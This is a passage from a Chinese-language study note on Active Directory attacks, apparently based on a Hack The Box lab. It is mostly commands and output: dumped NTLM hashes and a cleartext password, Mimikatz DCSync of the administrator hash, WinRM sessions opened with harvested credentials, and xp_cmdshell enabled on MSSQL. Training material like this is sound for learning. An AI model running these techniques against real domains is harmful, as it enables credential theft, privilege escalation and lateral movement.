class="variable">$</span>:<span class="number">1108</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">1</span>c7e2801ca48d0a5e3d5baf9e68367<span class="built_in">ac</span>:::</span><br><span class="line">inlanefreight.local\htb<span class="literal">-student</span>:<span class="number">1111</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">2487</span>a01dd672b583415cb52217824bb5:::</span><br><span class="line">inlanefreight.local\avazquez:<span class="number">1112</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">58</span>a478135a93ac3bf058a5ea0e8fdb71:::</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">d0wngrade:des<span class="literal">-cbc-md5</span>:d6fee0b62aa410fe</span><br><span class="line">d0wngrade:dec<span class="literal">-cbc-crc</span>:d6fee0b62aa410fe</span><br><span class="line">ACADEMY<span class="literal">-EA-FILE</span><span class="variable">$</span>:des<span class="literal">-cbc-md5</span>:eaef54a2c101406d</span><br><span class="line">svc_qualys:des<span class="literal">-cbc-md5</span>:f125ab34b53eb61c</span><br><span class="line">forend:des<span class="literal">-cbc-md5</span>:e3c14adf9d8a04c1</span><br><span class="line">[*] ClearText password from \\<span class="number">172.16</span>.<span class="number">5.5</span>\ADMIN<span class="variable">$</span>\Temp\HOLJALFD.tmp </span><br><span class="line">proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-ADUser-进行进一步枚举"><a href="#使用-Get-ADUser-进行进一步枚举" class="headerlink" title="使用 Get-ADUser 进行进一步枚举"></a>使用 Get-ADUser 进行进一步枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> <span class="string">&#x27;userAccountControl -band 128&#x27;</span> <span class="literal">-Properties</span> userAccountControl</span><br><span class="line"></span><br><span class="line">DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled            : True</span><br><span class="line">GivenName          :</span><br><span class="line">Name               : PROXYAGENT</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGUID         : c72d37d9<span class="literal">-e9ff-4e54-9afa-77775eaaf334</span></span><br><span class="line">SamAccountName     : proxyagent</span><br><span class="line">SID                : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5222</span></span><br><span class="line">Surname            :</span><br><span class="line">userAccountControl : <span class="number">640</span></span><br><span class="line">UserPrincipalName  :</span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainUser-检查可逆加密选项"><a href="#使用-Get-DomainUser-检查可逆加密选项" class="headerlink" title="使用 Get-DomainUser 检查可逆加密选项"></a>使用 Get-DomainUser 检查可逆加密选项</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.useraccountcontrol <span class="operator">-like</span> <span class="string">&#x27;*ENCRYPTED_TEXT_PWD_ALLOWED*&#x27;</span>&#125; |<span class="built_in">select</span> samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                         useraccountcontrol</span><br><span class="line"><span class="literal">--------------</span>                         <span class="literal">------------------</span></span><br><span class="line">proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure>

<h3 id="使用-runas-exe"><a href="#使用-runas-exe" class="headerlink" title="使用 runas.exe"></a>使用 runas.exe</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version <span class="number">10</span>.<span class="number">0</span>.<span class="number">17763</span>.<span class="number">107</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">runas</span> /<span class="title">netonly</span> /<span class="title">user:INLANEFREIGHT</span>\<span class="title">adunn</span> <span class="title">powershell</span></span></span><br><span class="line"><span class="function"><span class="title">Enter</span> <span class="title">the</span> <span class="title">password</span> <span class="title">for</span> <span class="title">INLANEFREIGHT</span>\<span class="title">adunn</span>:</span></span><br><span class="line"><span class="function"><span class="title">Attempting</span> <span class="title">to</span> <span class="title">start</span> <span class="title">powershell</span> <span class="title">as</span> <span class="title">user</span> &quot;<span class="title">INLANEFREIGHT</span>\<span class="title">adunn</span>&quot; ...</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-Mimikatz-执行攻击"><a href="#使用-Mimikatz-执行攻击" class="headerlink" title="使用 Mimikatz 执行攻击"></a>使用 Mimikatz 执行攻击</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\administrator&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : administrator</span><br><span class="line">User Principal Name  : administrator@inlanefreight.local</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">49</span>:<span class="number">32</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">88</span>ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">4625</span>fd0c31368ff4c255a3b876eaac3d</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Stacking-The-Deck-积累特权访问权限"><a href="#Stacking-The-Deck-积累特权访问权限" class="headerlink" title="Stacking The Deck(积累特权访问权限)"></a>Stacking The Deck(积累特权访问权限)</h1><h2 id="特权访问"><a href="#特权访问" class="headerlink" title="特权访问"></a>特权访问</h2><ul>
<li><p><code>Pass-the-Hash</code> 攻击，通过 SMB 协议进行身份验证</p>
</li>
<li><p><code>Remote Desktop Protocol</code> ( <code>RDP</code> ) - 是一种远程访问&#x2F;管理协议，使我们能够通过图形用户界面访问目标主机</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2">PowerShell Remoting</a>（也称为 PSRemoting 或 Windows 远程管理 (WinRM) 访问）是一种远程访问协议，允许我们在远程主机上运行命令或进入交互式命令行会话，使用 PowerShell 实现</p>
</li>
<li><p><code>MSSQL Server</code> - 拥有 SQL Server 实例 sysadmin 权限的账户可以远程登录该实例，并对数据库执行查询。此访问权限可用于通过多种方法在 SQL Server 服务账户的上下文中运行操作系统命令。</p>
</li>
</ul>
<h3 id="枚举远程桌面用户组"><a href="#枚举远程桌面用户组" class="headerlink" title="枚举远程桌面用户组"></a>枚举远程桌面用户组</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-NetLocalGroupMember</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-GroupName</span> <span class="string">&quot;Remote Desktop Users&quot;</span></span><br><span class="line"></span><br><span class="line">ComputerName : ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">GroupName    : Remote Desktop Users</span><br><span class="line">MemberName   : INLANEFREIGHT\Domain Users</span><br><span class="line">SID          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-513</span></span><br><span class="line">IsGroup      : True</span><br><span class="line">IsDomain     : UNKNOWN</span><br></pre></td></tr></table></figure>

<h3 id="枚举远程管理用户组"><a href="#枚举远程管理用户组" class="headerlink" title="枚举远程管理用户组"></a>枚举远程管理用户组</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-NetLocalGroupMember</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-GroupName</span> <span class="string">&quot;Remote Management Users&quot;</span></span><br><span class="line"></span><br><span class="line">ComputerName : ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">GroupName    : Remote Management Users</span><br><span class="line">MemberName   : INLANEFREIGHT\forend</span><br><span class="line">SID          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5614</span></span><br><span class="line">IsGroup      : False</span><br><span class="line">IsDomain     : UNKNOWN</span><br></pre></td></tr></table></figure>

<h3 id="从-Windows-Linux-建立-WinRM-会话"><a href="#从-Windows-Linux-建立-WinRM-会话" class="headerlink" title="从 Windows&#x2F;Linux 建立 WinRM 会话"></a>从 Windows&#x2F;Linux 建立 WinRM 会话</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$password</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Klmcargo2&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$cred</span> = <span class="built_in">new-object</span> System.Management.Automation.PSCredential (<span class="string">&quot;INLANEFREIGHT\forend&quot;</span>, <span class="variable">$password</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01</span>]: <span class="built_in">PS</span> C:\Users\forend\Documents&gt; hostname</span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01</span>]: <span class="built_in">PS</span> C:\Users\forend\Documents&gt; <span class="built_in">Exit-PSSession</span></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend</span><br><span class="line"></span><br><span class="line">Enter Password: </span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents&gt; hostname</span><br><span class="line">ACADEMY-EA-MS01</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Server-管理员"><a href="#SQL-Server-管理员" class="headerlink" title="SQL Server 管理员"></a>SQL Server 管理员</h3><h4 id="使用-PowerUpSQL-枚举-MSSQL-实例"><a href="#使用-PowerUpSQL-枚举-MSSQL-实例" class="headerlink" title="使用 PowerUpSQL 枚举 MSSQL 实例"></a>使用 PowerUpSQL 枚举 MSSQL 实例</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">cd</span> .\PowerUpSQL\</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt;  <span class="built_in">Import-Module</span> .\PowerUpSQL.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt;  <span class="built_in">Get-SQLInstanceDomain</span></span><br><span class="line"></span><br><span class="line">ComputerName     : ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">Instance         : ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL,<span class="number">1433</span></span><br><span class="line">DomainAccountSid : <span class="number">1500000521000170152142291832437223174127203170152400</span></span><br><span class="line">DomainAccount    : damundsen</span><br><span class="line">DomainAccountCn  : Dana Amundsen</span><br><span class="line">Service          : MSSQLSvc</span><br><span class="line">Spn              : MSSQLSvc/ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL:<span class="number">1433</span></span><br><span class="line">LastLogon        : <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">59</span> AM</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt;  <span class="built_in">Get-SQLQuery</span> <span class="literal">-Verbose</span> <span class="literal">-Instance</span> <span class="string">&quot;172.16.5.150,1433&quot;</span> <span class="literal">-username</span> <span class="string">&quot;inlanefreight\damundsen&quot;</span> <span class="literal">-password</span> <span class="string">&quot;SQL1234!&quot;</span> <span class="literal">-query</span> <span class="string">&#x27;Select @@version&#x27;</span></span><br><span class="line"></span><br><span class="line">VERBOSE: <span class="number">172.16</span>.<span class="number">5.150</span>,<span class="number">1433</span> : Connection Success.</span><br><span class="line"></span><br><span class="line">Column1</span><br><span class="line"><span class="literal">-------</span></span><br><span class="line">Microsoft SQL Server <span class="number">2017</span> (RTM) - <span class="number">14.0</span>.<span class="number">1000.169</span> (X64) ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br></pre></td></tr></table></figure>

<h4 id="使用-xp-cmdshell-枚举系统中的权限"><a href="#使用-xp-cmdshell-枚举系统中的权限" class="headerlink" title="使用 xp_cmdshell 枚举系统中的权限"></a>使用 xp_cmdshell 枚举系统中的权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; enable_xp_cmdshell</span><br><span class="line"></span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell <span class="built_in">whoami</span> /priv</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION                                                             </span><br><span class="line"></span><br><span class="line">----------------------                                                             </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State      </span><br><span class="line"></span><br><span class="line">============================= ========================================= ========   </span><br><span class="line"></span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   </span><br><span class="line"></span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="keyword">for</span> a process        Disabled   </span><br><span class="line"></span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    </span><br><span class="line"></span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    </span><br><span class="line"></span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled    </span><br><span class="line"></span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled    </span><br><span class="line"></span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>            Disabled   </span><br><span class="line"></span><br><span class="line">NULL       </span><br></pre></td></tr></table></figure>

<h2 id="Kerberos“双跳”问题"><a href="#Kerberos“双跳”问题" class="headerlink" title="Kerberos“双跳”问题"></a>Kerberos“双跳”问题</h2><p>“双跳”问题在使用 WinRM&#x2F;Powershell 时常出现，因为默认的身份验证机制仅提供访问特定资源的票据。这可能导致在尝试进行横向移动或从远程 shell 访问文件共享时出现问题。在这种情况下，使用的用户账户有权执行操作但被拒绝访问。获取 shell 最常见的方式是攻击目标主机上的应用程序或使用 PSExec 等工具和凭据。在这两种场景中，初始身份验证很可能通过 SMB 或 LDAP 进行，这意味着用户的 NTLM 哈希会被存储在内存中。有时我们拥有一组凭据，并被限制使用特定身份验证方法，如 WinRM，或出于多种原因更倾向于使用 WinRM。</p>
<h4 id="PSCredential-对象"><a href="#PSCredential-对象" class="headerlink" title="PSCredential 对象"></a>PSCredential 对象</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span></span><br><span class="line">Exception calling <span class="string">&quot;FindAll&quot;</span> with <span class="string">&quot;0&quot;</span> argument(s): <span class="string">&quot;An operations error occurred.</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">At C:\Users\backupadm\Documents\PowerView.ps1:<span class="number">5253</span> char:<span class="number">20</span></span><br><span class="line">+             <span class="keyword">else</span> &#123; <span class="variable">$Results</span> = <span class="variable">$UserSearcher</span>.FindAll() &#125;</span><br><span class="line">+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</span><br><span class="line">    + FullyQualifiedErrorId : DirectoryServicesCOMException</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x57f8a</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt; Client: backupadm @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">    Server: academy<span class="literal">-aen-ms0</span><span class="variable">$</span> <span class="selector-tag">@</span></span><br><span class="line">    KerbTicket Encryption <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">    Ticket Flags <span class="number">0</span>xa10000 -&gt; renewable pre_authent name_canonicalize</span><br><span class="line">    <span class="built_in">Start</span> Time: <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">31</span>:<span class="number">53</span> (local)</span><br><span class="line">    <span class="keyword">End</span> Time:   <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">46</span>:<span class="number">53</span> (local)</span><br><span class="line">    Renew Time: <span class="number">7</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">31</span>:<span class="number">18</span> (local)</span><br><span class="line">    Session Key <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">    Cache Flags: <span class="number">0</span>x4 -&gt; S4U</span><br><span class="line">    Kdc Called: DC01.INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;!qazXSW@&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt;  <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\backupadm&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br></pre></td></tr></table></figure>

